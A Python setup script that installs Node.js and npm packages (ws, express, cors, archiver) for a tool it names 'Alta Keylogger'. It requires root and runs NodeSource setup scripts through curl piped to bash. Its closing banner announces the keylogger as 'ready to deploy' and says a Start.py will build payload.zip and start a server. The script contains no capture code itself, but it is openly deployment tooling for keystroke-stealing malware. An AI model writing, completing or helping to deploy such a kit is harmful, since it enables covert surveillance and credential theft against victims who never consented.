#!/usr/bin/env python3
"""
Advanced dependency installer for Alta Keylogger
- Installs Node.js (LTS) via official NodeSource if missing
- Installs npm packages: ws, express, cors, archiver
- Works on Debian/Ubuntu, RHEL/CentOS/Fedora, Arch Linux
"""

import subprocess
import sys
import os
import platform
from pathlib import Path

# Colors
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RED = "\033[91m"
RESET = "\033[0m"
BOLD = "\033[1m"

def run_cmd(cmd, check=True, capture=False):
    """Run a shell command and return output if capture=True."""
    try:
        if capture:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result.stdout.strip()
        else:
            subprocess.run(cmd, shell=True, check=check)
            return ""
    except subprocess.CalledProcessError as e:
        print(f"{RED}❌ Command failed: {cmd}{RESET}")
        if e.stderr:
            print(e.stderr)
        sys.exit(1)

def check_command(cmd):
    """Check if a command exists."""
    return subprocess.run(f"which {cmd}", shell=True, capture_output=True).returncode == 0

def detect_package_manager():
    """Detect which package manager is available."""
    if check_command("apt"):
        return "apt"
    elif check_command("dnf"):
        return "dnf"
    elif check_command("yum"):
        return "yum"
    elif check_command("pacman"):
        return "pacman"
    else:
        return None

def install_nodejs():
    """Install Node.js LTS using official NodeSource or distro packages."""
    if check_command("node"):
        node_version = run_cmd("node -v", capture=True)
        print(f"{GREEN}✅ Node.js already installed: {node_version}{RESET}")
        return True
    
    print(f"{CYAN}📦 Installing Node.js LTS...{RESET}")
    pm = detect_package_manager()
    
    if pm == "apt":
        # Debian/Ubuntu – use NodeSource
        run_cmd("curl -fsSL https://deb.nodesource.com/setup_lts.x | bash -")
        run_cmd("apt install -y nodejs")
    elif pm in ["dnf", "yum"]:
        # RHEL / CentOS / Fedora
        run_cmd("curl -fsSL https://rpm.nodesource.com/setup_lts.x | bash -")
        run_cmd(f"{pm} install -y nodejs")
    elif pm == "pacman":
        # Arch Linux
        run_cmd("pacman -S --noconfirm nodejs npm")
    else:
        print(f"{RED}❌ Unsupported package manager. Please install Node.js manually.{RESET}")
        sys.exit(1)
    
    if check_command("node"):
        print(f"{GREEN}✅ Node.js installed: {run_cmd('node -v', capture=True)}{RESET}")
    else:
        print(f"{RED}❌ Node.js installation failed.{RESET}")
        sys.exit(1)

def install_npm_packages():
    """Install required npm packages in the current directory."""
    required = ["ws", "express", "cors", "archiver"]
    print(f"{CYAN}📦 Installing npm packages: {', '.join(required)}...{RESET}")
    
    # Check if package.json exists, create one if not (to avoid warnings)
    if not Path("package.json").exists():
        run_cmd("npm init -y")
    
    for pkg in required:
        run_cmd(f"npm install {pkg}")
    
    print(f"{GREEN}✅ All npm packages installed.{RESET}")

def print_usage():
    """Print final instructions."""
    print(f"\n{BOLD}{GREEN}╔══════════════════════════════════════════════════════════╗")
    print(f"║  {CYAN}✨ ALTA KEYLOGGER – READY TO DEPLOY ✨{GREEN}                  ║")
    print(f"╚══════════════════════════════════════════════════════════╝{RESET}")
    print(f"\n{YELLOW}➜ Run the main script:{RESET}")
    print(f"   {BOLD}python3 Start.py{RESET}\n")
    print(f"{CYAN}➜ It will ask for a port, create payload.zip, and start the server.{RESET}\n")

def main():
    print(f"\n{BOLD}{CYAN}🔧 Alta Keylogger – Automatic Dependency Installer{RESET}\n")
    
    # Check for root/sudo (required for system packages)
    if os.geteuid() != 0:
        print(f"{YELLOW}⚠️  This script needs root privileges to install Node.js and system packages.{RESET}")
        print(f"{YELLOW}➜ Please run with: sudo python3 install_deps.py{RESET}\n")
        sys.exit(1)
    
    # 1. Install Node.js + npm if missing
    install_nodejs()
    
    # 2. Install npm packages (ws, express, cors, archiver)
    # Change to the directory where server.js is located (assume same as script)
    script_dir = Path(__file__).parent
    os.chdir(script_dir)
    install_npm_packages()
    
    # 3. Done
    print_usage()

if __name__ == "__main__":
    main()
